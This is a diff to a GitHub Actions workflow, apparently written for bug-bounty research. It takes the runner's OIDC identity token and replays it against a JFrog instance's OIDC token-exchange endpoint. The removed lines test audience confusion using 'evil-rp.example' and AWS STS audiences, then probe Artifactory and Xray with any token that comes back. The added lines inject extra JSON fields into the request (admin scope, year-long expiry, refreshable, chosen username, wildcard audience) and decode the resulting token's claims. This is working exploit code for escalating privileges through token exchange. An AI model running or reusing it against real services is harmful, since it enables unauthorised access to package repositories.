@@ -10,16 +10,9 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |
-          ex() { A=$1; P=$2
-            T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$A" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
-            if [ -n "$P" ]; then B="{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:id_token\",\"subject_token\":\"$T\",\"provider_name\":\"$P\"}"; else B="{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:id_token\",\"subject_token\":\"$T\"}"; fi
-            echo "### aud=$A provider=${P:-NONE}"
-            curl -s -o /tmp/o -w 'HTTP %{http_code}\n' -X POST -H 'Content-Type: application/json' -d "$B" https://trialuakwcj.jfrog.io/access/api/v1/oidc/token
-            python3 -c 'import json,base64;b=open("/tmp/o").read();d=json.loads(b) if b.startswith("{") else {};t=d.get("access_token");p=(t.split(".")[1]+"==") if t else "";c=json.loads(base64.urlsafe_b64decode(p)) if t else {};print("JFROG", {k:c.get(k) for k in ("sub","scp","aud")}) if t else print("BODY",b[:200])'
-            J=$(python3 -c 'import json;b=open("/tmp/o").read();print(json.loads(b).get("access_token","") if b.startswith("{") else "")')
-            [ -n "$J" ] && for U in /artifactory/api/repositories /xray/api/v1/system/version; do echo "HTTP svc $U $(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $J" https://trialuakwcj.jfrog.io$U)"; done
-          }
-          ex evil-rp.example ""
-          ex sts.amazonaws.com ""
-          ex r2aud ""
-          ex evil-rp.example r2audgh
+          for EXTRA in '' ',"expires_in":31536000' ',"refreshable":true' ',"scope":"applied-permissions/admin"' ',"username":"sant0x@bugcrowdninja.com"' ',"audience":"*@*","expires_in":0'; do
+            T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=jfrog-github" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+            echo "### extra=$EXTRA"
+            curl -s -o /tmp/o -w 'HTTP %{http_code}\n' -X POST -H 'Content-Type: application/json' -d "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:id_token\",\"subject_token\":\"$T\",\"provider_name\":\"sanhacks2/r1pin@github\"$EXTRA}" https://trialuakwcj.jfrog.io/access/api/v1/oidc/token || true
+            python3 -c 'import json,base64;b=open("/tmp/o").read();d=json.loads(b) if b.startswith("{") else {};t=d.get("access_token");p=(t.split(".")[1]+"==") if t else "";c=json.loads(base64.urlsafe_b64decode(p)) if t else {};print("JFROG", {k:c.get(k) for k in ("sub","scp","aud")}, "life", (c.get("exp",0)-c.get("iat",0)) if c else None, "refresh", bool(d.get("refresh_token")), "resp_expires_in", d.get("expires_in")) if t else print("BODY",b[:200])' || true
+          done
